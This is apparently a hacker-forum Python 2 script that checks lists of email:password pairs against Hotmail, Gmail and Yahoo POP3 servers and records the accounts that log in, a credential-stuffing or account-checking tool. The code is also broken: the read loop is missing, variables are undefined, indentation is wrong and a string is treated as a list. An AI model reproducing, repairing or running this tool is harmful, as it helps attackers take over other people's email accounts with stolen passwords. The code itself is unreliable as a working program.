#!/Usr/bin/python  
#RE_WRITTEN LMAO ~Leo
  
import sys, poplib, os  
os.system ("clear")
def printHelp ():  
    print "Usage: email.py <domain> <emails>" 
    print "Ex: email.py yahoo emails.txt"
    print "Ex: email.py gmail emails.txt"  
    print "Ex: email.py hotmail emails.txt"  
    print "Note: The Accounts must be in the following Format: user@mail.com : password \n" 

if  len (sys.argv) != 3:
    printHelp ()  
    exit (1)  
SAVEFILE = "valid_emails.txt"  
if sys.argv[1] == "hotmail":  
    HOST = "pop3.live.com"
    PORT = "995"  
    print "Checking Hotmail Account Now \n"
else:  
    pass  
if sys.argv[1] == "gmail":  
    HOST = "pop.gmail.com"
    PORT = "995"
    print "Checking Gmail Account Now"  
else:  
    pass  
if sys.argv[1] == "yahoo":  
    HOST = "plus.pop.mail.yahoo.com"  
    PORT = "995"  
    print "Checking Yahoo Account Now \n"  
  
  
  
# Do not change anything below.  
maillist = sys.argv[2]  
valid = "valid_emails.txt"
currline = 0  
  
try:  
    handle = open (maillist)  
except:  
    print "\n I can not open the mail list.Dude!!! Be carefull!!!"
    print "\n Leaving ... Ciao!"
    exit (1)  
  
    try:  
        pop = poplib.POP3_SSL (HOST, PORT)  
        pop.user (email)  
        pop.pass_ (password)  
        valid.append (email + ':' + password)  
        print "Checking: %s < %s > -> Valid! \n"% (email, password)  
        pop.quit ()  
    except:  
        print "Checking:% s <% s> -> Invalid!" % (Email, password) 
        pass  
  
print "Total Valid: %s"% len(valid)  
print "Done. \n"